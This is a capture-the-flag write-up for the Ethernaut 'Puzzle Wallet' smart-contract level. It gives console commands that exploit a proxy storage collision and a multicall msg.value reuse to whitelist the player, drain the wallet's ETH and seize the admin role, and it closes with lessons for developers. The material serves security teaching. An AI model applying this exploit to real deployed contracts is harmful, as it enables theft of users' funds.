# Challenge Puzzle Wallet

Nowadays, paying for DeFi operations is impossible, fact.

A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.

They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.

Little did they know, their lunch money was at risk…

  You'll need to hijack this wallet to become the admin of the proxy.

Things that might help:
- Understanding how *delegatecall* works and how *msg.sender* and *msg.value* behaves when performing one.
- Knowing about proxy patterns and the way they handle storage variables.

# Need to know
- [Proxy](note.md/#proxy)
- [Storage layout mistakes](note.md/#storage)
- [How multicall function work](./24-attackPuzzleWallet.sol)

# How to do
Exploit *pendingAdmin* slot with Player address <> Owner

**Console**
1. add functionSignature to ABI

```ruby
functionSignature = {
  name: 'proposeNewAdmin',
  type: 'function',
  inputs: [
    {
      type: 'address',
      name: '_newAdmin'
    }
  ]
}
params = [player]
data = web3.eth.abi.encodeFunctionCall(functionSignature, params)
'0xa63767460000000000000000000000006507a5f34d98b8345e182ef588ab14a7f4e714ae'
await web3.eth.sendTransaction({from: player, to: instance, data})
```

1. now we on pendingAdmin ,so we can add *player* to whitelist for *player* can call all functions that have *onlyWhitelisted* modifier

```ruby
await contract.addToWhitelist(player)
```

1. deposit() method

```ruby
depositData = await contract.methods["deposit()"].request().then(v => v.data)
'0xd0e30db0'
```
1. multicall() method with param of deposit function call signature

```ruby
multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)
'0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000'
await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})
```
1. getBalance()

```ruby
await getBalance(contract.address)
'0.002'
```

1. call execute() for deposit all money to *player*

```ruby
await contract.execute(player, toWei('0.002'), 0x0)
await getBalance(contract.address)
'0'
```

1. We can call setMaxBalance() because contract.balance = 0
1. call setMaxBalance() to change maxBalance(slot1) but it will change admin(slot 1) to *player* because it have the same storage slot1

```ruby
await contract.setMaxBalance(player)
```

# Result

Next time, those friends will request an audit before depositing any money on a contract. Congrats!

Frequently, using proxy contracts is highly recommended to bring upgradeability features and reduce the deployment's gas cost. However, developers must be careful not to introduce storage collisions, as seen in this level.

Furthermore, iterating over operations that consume ETH can lead to issues if it is not handled correctly. Even if ETH is spent, *msg.value* will remain the same, so the developer must manually keep track of the actual remaining amount on each iteration. This can also lead to issues when using a multi-call pattern, as performing multiple *delegatecalls* to a function that looks safe on its own could lead to unwanted transfers of ETH, as *delegatecalls* keep the original *msg.value* sent to the contract.

Move on to the next level when you're ready!
